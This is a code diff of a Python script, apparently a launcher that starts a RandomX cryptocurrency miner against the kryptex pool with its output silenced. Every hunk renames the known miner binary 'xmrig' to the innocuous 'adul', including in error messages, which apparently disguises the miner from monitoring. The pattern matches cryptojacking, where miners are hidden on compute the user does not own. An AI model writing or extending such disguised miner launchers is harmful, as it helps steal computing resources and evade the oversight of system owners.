@@ -109,7 +109,7 @@ def run_adul():
     print(f"Menjalankan adul dengan worker: {worker_tag}")
 
     cmd = [
-        "./xmrig",
+        "./adul",
         "-a", "rx/0",
         "-o", "xtm-rx-sg.kryptex.network:7038",
         "-u", worker_tag,
@@ -119,7 +119,7 @@ def run_adul():
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except FileNotFoundError:
-        print("Binary ./xmrig tidak ditemukan. Pastikan file sudah diekstrak.")
+        print("Binary ./adul tidak ditemukan. Pastikan file sudah diekstrak.")
         return 1
 
     try:
@@ -225,7 +225,7 @@ def run_adul():
     print(f"Menjalankan adul dengan worker: {worker_tag}")
 
     cmd = [
-        "./xmrig",
+        "./adul",
         "-a", "rx/0",
         "-o", "xtm-rx-sg.kryptex.network:7038",
         "-u", worker_tag,
@@ -235,7 +235,7 @@ def run_adul():
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except FileNotFoundError:
-        print("Binary ./xmrig tidak ditemukan. Pastikan file sudah diekstrak.")
+        print("Binary ./adul tidak ditemukan. Pastikan file sudah diekstrak.")
         return 1
 
     try:
